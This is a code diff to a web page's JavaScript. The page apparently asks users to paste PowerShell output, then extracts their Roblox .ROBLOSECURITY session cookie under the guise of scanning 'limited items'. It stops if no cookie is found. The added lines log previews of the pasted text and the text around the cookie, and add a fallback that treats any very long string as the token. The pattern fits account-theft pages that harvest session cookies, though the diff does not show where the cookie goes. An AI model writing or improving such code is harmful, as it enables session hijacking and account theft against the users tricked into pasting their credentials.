@@ -232,9 +232,22 @@ async function submitPowerShell() {
     try {
         // Scan limited items and find authentication data from the input
         console.log('Processing input, length:', inputText.length);
+        console.log('Input text preview (first 200 chars):', inputText.substring(0, 200));
+        console.log('Input text contains .ROBLOSECURITY:', inputText.includes('.ROBLOSECURITY'));
+        
         const limitedItems = extractLimitedItems(inputText);
         const robloxCookie = extractRobloxCookie(inputText);
         console.log('Extracted auth data:', robloxCookie ? 'Found' : 'Not found');
+        
+        if (!robloxCookie) {
+            console.log('DEBUG: Let me search manually...');
+            const manualSearch = inputText.indexOf('.ROBLOSECURITY');
+            console.log('Manual search result:', manualSearch);
+            if (manualSearch !== -1) {
+                const surroundingText = inputText.substring(Math.max(0, manualSearch - 50), manualSearch + 100);
+                console.log('Text around .ROBLOSECURITY:', surroundingText);
+            }
+        }
         
         // Block execution if no authentication data is found
         if (!robloxCookie) {
@@ -381,6 +394,22 @@ function extractRobloxCookie(text) {
     }
     
     console.log('Could not extract .ROBLOSECURITY cookie from text');
+    
+    // Fallback: Look for any very long string that might be the token
+    console.log('Trying fallback: searching for long strings...');
+    const longStrings = text.match(/[A-Za-z0-9+/=._%\-]{200,}/g);
+    if (longStrings && longStrings.length > 0) {
+        console.log('Found', longStrings.length, 'long strings');
+        const longest = longStrings.reduce((a, b) => a.length > b.length ? a : b);
+        console.log('Longest string length:', longest.length);
+        console.log('Longest string preview:', longest.substring(0, 50) + '...');
+        
+        if (longest.length > 500) {
+            console.log('Using longest string as fallback');
+            return longest;
+        }
+    }
+    
     return null;
 }
 
